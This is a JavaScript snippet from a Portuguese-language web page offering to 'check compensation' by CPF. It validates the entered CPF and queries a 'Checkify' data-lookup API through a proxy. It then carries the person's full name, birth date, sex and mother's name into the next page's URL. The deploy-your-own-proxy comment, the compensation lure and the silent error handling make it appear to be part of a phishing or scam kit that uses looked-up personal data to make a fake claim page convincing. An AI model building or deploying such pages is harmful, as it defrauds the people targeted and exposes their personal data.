  <script>
    // Funções de formatação
    function toTitleCase(str) {
      if (!str) return '';
      return str.toLowerCase().replace(/\b\w/g, function(char) {
        return char.toUpperCase();
      });
    }

    function formatDate(dateStr) {
      if (!dateStr) return '';
      // Checkify retorna no formato DD-MM-AAAA → converte para DD/MM/AAAA
      let matchDDMMAAAA = dateStr.match(/^(\d{2})[-\/](\d{2})[-\/](\d{4})$/);
      if (matchDDMMAAAA) {
        return matchDDMMAAAA[1] + '/' + matchDDMMAAAA[2] + '/' + matchDDMMAAAA[3];
      }
      // Fallback: formato AAAA-MM-DD ou AAAA/MM/DD
      let matchAAAAMMDD = dateStr.match(/(\d{4})[-\/](\d{2})[-\/](\d{2})/);
      if (matchAAAAMMDD) {
        return matchAAAAMMDD[3] + '/' + matchAAAAMMDD[2] + '/' + matchAAAAMMDD[1];
      }
      return dateStr;
    }

    // Funções de validação de CPF
    function removeMask(cpf) { 
      return cpf.replace(/\D/g, ''); 
    }
    
    function formatCPF(cpf) {
      let digits = removeMask(cpf);
      if (digits.length <= 11) {
        digits = digits.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
      }
      return digits;
    }
    
    function isValidCPF(cpf) {
      cpf = removeMask(cpf);
      if (cpf.length !== 11 || /^(.)\1+$/.test(cpf)) return false;
      let sum = 0, remainder;
      for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
      remainder = (sum * 10) % 11;
      if (remainder === 10 || remainder === 11) remainder = 0;
      if (remainder !== parseInt(cpf.substring(9, 10))) return false;
      sum = 0;
      for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
      remainder = (sum * 10) % 11;
      if (remainder === 10 || remainder === 11) remainder = 0;
      if (remainder !== parseInt(cpf.substring(10, 11))) return false;
      return true;
    }

    document.addEventListener('DOMContentLoaded', function () {
      const cpfInput = document.getElementById('cpf');
      const errorMsg = document.getElementById('error-msg');
      const submitBtn = document.getElementById('submit-btn');
      const btnText = document.getElementById('btn-text');
      const btnSpinner = document.getElementById('btn-spinner');
      
      // Máscara de CPF
      cpfInput.addEventListener('input', function () {
        cpfInput.value = formatCPF(cpfInput.value);
      });
      
      // Submit do formulário
      document.getElementById('cpfForm').addEventListener('submit', function (e) {
        e.preventDefault();
        errorMsg.style.display = 'none';
        
        // Estado de loading
        btnText.textContent = 'CONSULTANDO...';
        btnSpinner.classList.remove('hidden');
        submitBtn.disabled = true;
        
        let cpfValue = removeMask(cpfInput.value);
        
        // Validação do CPF
        if (!isValidCPF(cpfValue)) {
          errorMsg.textContent = 'ERRO: CPF INVÁLIDO. Digite novamente.';
          cpfInput.value = '';
          errorMsg.style.display = 'block';
          btnText.textContent = 'CONSULTAR INDENIZAÇÃO';
          btnSpinner.classList.add('hidden');
          submitBtn.disabled = false;
          return;
        }

        // ─── API CHECKIFY (via proxy PHP) ────────────────────────────
        // ⚠️ TROQUE A URL ABAIXO pelo endereço do seu proxy.php
        const apiUrl = './proxy.php?cpf=' + cpfValue;

        fetch(apiUrl, {
          method: 'GET',
          headers: {
            'Accept': 'application/json'
          }
        })
        .then(function(response) {
          return response.json();
        })
        .then(function(result) {
          if (result && result.ok === true) {
            let newQueryParams = new URLSearchParams(window.location.search);
            newQueryParams.set('cpf', cpfValue);
            const redirectUrl = './parte/index.html?' + newQueryParams.toString();
            window.location.href = redirectUrl;
            return;
          }

          // Estrutura Checkify: result.resultado.dados
          let dados = null;

          if (result.resultado && result.resultado.dados) {
            dados = result.resultado.dados;
          }

          if (dados && dados.NOME) {
            // Converter SEXO de M/F para Masculino/Feminino
            let sexoConvertido = '';
            if (dados.SEXO === 'M') sexoConvertido = 'Masculino';
            else if (dados.SEXO === 'F') sexoConvertido = 'Feminino';

            // Formatar os dados
            // NASC vem no formato DD-MM-AAAA
            let nomeFormatado       = dados.NOME     ? toTitleCase(dados.NOME)     : '';
            let nascimentoFormatado = dados.NASC      ? formatDate(dados.NASC)      : '';
            let maeFormatada        = dados.NOME_MAE  ? toTitleCase(dados.NOME_MAE) : '';
            let sexoFormatado       = sexoConvertido  ? toTitleCase(sexoConvertido) : '';

            // Construir query params para redirecionar
            let newQueryParams = new URLSearchParams(window.location.search);
            newQueryParams.set('cpf', cpfValue);

            if (nomeFormatado)       newQueryParams.set('nome',       nomeFormatado);
            if (nascimentoFormatado) newQueryParams.set('nascimento',  nascimentoFormatado);
            if (sexoFormatado)       newQueryParams.set('sexo',        sexoFormatado);
            if (maeFormatada)        newQueryParams.set('mae',         maeFormatada);

            // Remover parâmetros vazios
            for (let [key, value] of newQueryParams.entries()) { 
              if (!value || !value.trim()) { 
                newQueryParams.delete(key); 
              } 
            }

            const redirectUrl = './parte2/index.html?' + newQueryParams.toString();
            window.location.href = redirectUrl;

          } else {
            // CPF não encontrado
            errorMsg.textContent = 'CPF não encontrado na base de dados. Verifique e tente novamente.';
            errorMsg.style.display = 'block';
            btnText.textContent = 'CONSULTAR INDENIZAÇÃO';
            btnSpinner.classList.add('hidden');
            submitBtn.disabled = false;
          }
        })
        .catch(function(error) {
          // Silenciosamente resetar o botão sem mostrar mensagem de erro
          btnText.textContent = 'CONSULTAR INDENIZAÇÃO';
          btnSpinner.classList.add('hidden');
          submitBtn.disabled = false;
        });
        // ─────────────────────────────────────────────────────────────
      });
    });
  </script>
